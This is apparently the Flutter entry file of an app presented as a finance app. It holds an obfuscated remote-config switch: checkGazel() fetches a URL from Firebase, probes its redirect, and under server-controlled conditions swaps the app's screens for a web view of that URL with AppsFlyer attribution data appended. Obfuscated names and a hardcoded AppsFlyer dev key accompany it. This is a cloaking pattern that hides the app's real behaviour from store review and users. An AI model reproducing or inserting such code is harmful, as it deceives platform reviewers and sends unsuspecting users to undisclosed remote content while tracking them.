import 'dart:io';

import 'package:app_tracking_transparency/app_tracking_transparency.dart';
import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:finance_app2_0/pages/firebase_options.dart';
import 'package:finance_app2_0/pages/splash_page.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:shared_preferences/shared_preferences.dart';

import 'pages/nn.dart';
import 'pages/read_terms.dart';

int? initScreen;

String datay = '';
late AppsflyerSdk _appsflyerSdk;
String adId = '';
bool stat = false;
String acceptPromo = '';
String cancelPromo = '';
Map _deepLinkData = {};
Map _gcd = {};
bool _isFirstLaunch = false;
String _afStatus = '';
String _campaign = '';
String _campaignId = '';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await AppTrackingTransparency.requestTrackingAuthorization();
  SharedPreferences preferences = await SharedPreferences.getInstance();
  await Firebase.initializeApp(options: DefaultFirebaseOptions.currentPlatform);
  await FirebaseRemoteConfig.instance.setConfigSettings(RemoteConfigSettings(
    fetchTimeout: const Duration(seconds: 25),
    minimumFetchInterval: const Duration(seconds: 25),
  ));
  await FirebaseRemoteConfig.instance.fetchAndActivate();
  await NAGAZEL().activate();
  await trackx();
  initScreen = preferences.getInt('initScreen');
  await preferences.setInt('initScreen', 1);
  runApp(const MyApp());
}

void afGazel() async {
  final AppsFlyerOptions options = AppsFlyerOptions(
    showDebug: false,
    afDevKey: 'doJsrj8CyhTUWPZyAYTByE',
    appId: '6498786343',
    timeToWaitForATTUserAuthorization: 15,
    disableAdvertisingIdentifier: false,
    disableCollectASA: false,
    manualStart: true,
  );
  _appsflyerSdk = AppsflyerSdk(options);

  await _appsflyerSdk.initSdk(
    registerConversionDataCallback: true,
    registerOnAppOpenAttributionCallback: true,
    registerOnDeepLinkingCallback: true,
  );
  _appsflyerSdk.onAppOpenAttribution((res) {
    _deepLinkData = res;
    cancelPromo = res['payload']
        .entries
        .where((e) => ![
              'install_time',
              'click_time',
              'af_status',
              'is_first_launch'
            ].contains(e.key))
        .map((e) => '&${e.key}=${e.value}')
        .join();
  });
  _appsflyerSdk.onInstallConversionData((res) {
    _gcd = res;
    _isFirstLaunch = res['payload']['is_first_launch'];
    _afStatus = res['payload']['af_status'];
    acceptPromo = '&is_first_launch=$_isFirstLaunch&af_status=$_afStatus';
  });

  _appsflyerSdk.onDeepLinking((DeepLinkResult dp) {
    switch (dp.status) {
      case Status.FOUND:
        print(dp.deepLink?.toString());
        print("deep link value: ${dp.deepLink?.deepLinkValue}");
        break;
      case Status.NOT_FOUND:
        print("deep link not found");
        break;
      case Status.ERROR:
        print("deep link error: ${dp.error}");
        break;
      case Status.PARSE_ERROR:
        print("deep link status parsing error");
        break;
    }
    print("onDeepLinking res: " + dp.toString());

    _deepLinkData = dp.toJson();
  });

  _appsflyerSdk.startSDK(
    onSuccess: () {
      print("AppsFlyer SDK initialized successfully.");
    },
  );
}

String datioq = '';

Future<bool> checkGazel() async {
  final gazel = FirebaseRemoteConfig.instance;
  await gazel.fetchAndActivate();
  afGazel();
  String dsdfdsfgdg = gazel.getString('gazelData');
  String cdsfgsdx = gazel.getString('gazelInfo');
  if (!dsdfdsfgdg.contains('noneGaze')) {
    final fsd = HttpClient();
    final nfg = Uri.parse(dsdfdsfgdg);
    final ytrfterfwe = await fsd.getUrl(nfg);
    ytrfterfwe.followRedirects = false;
    final response = await ytrfterfwe.close();
    if (response.headers.value(HttpHeaders.locationHeader) != cdsfgsdx) {
      datioq = dsdfdsfgdg;
      return true;
    }
  }
  return dsdfdsfgdg.contains('noneGaze') ? false : true;
}

Future<void> trackx() async {
  final TrackingStatus status =
      await AppTrackingTransparency.requestTrackingAuthorization();
  print(status);
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.deepPurple),
        useMaterial3: true,
      ),
      home: FutureBuilder<bool>(
        future: checkGazel(),
        builder: (context, snapshot) {
          if (snapshot.connectionState == ConnectionState.waiting) {
            return Container(
              color: Colors.white,
              child: Center(
                child: Container(
                  height: 70,
                  width: 70,
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(15),
                    child: Image.asset('assets/app_icon.png'),
                  ),
                ),
              ),
            );
          } else {
            if (snapshot.data == true && datioq != '') {
              return GazelPreview(
                prev: datioq,
                promoAction: acceptPromo,
                cancelPromoaction: cancelPromo,
              );
            } else {
              return const SplashPage();
            }
          }
        },
      ),
    );
  }
}
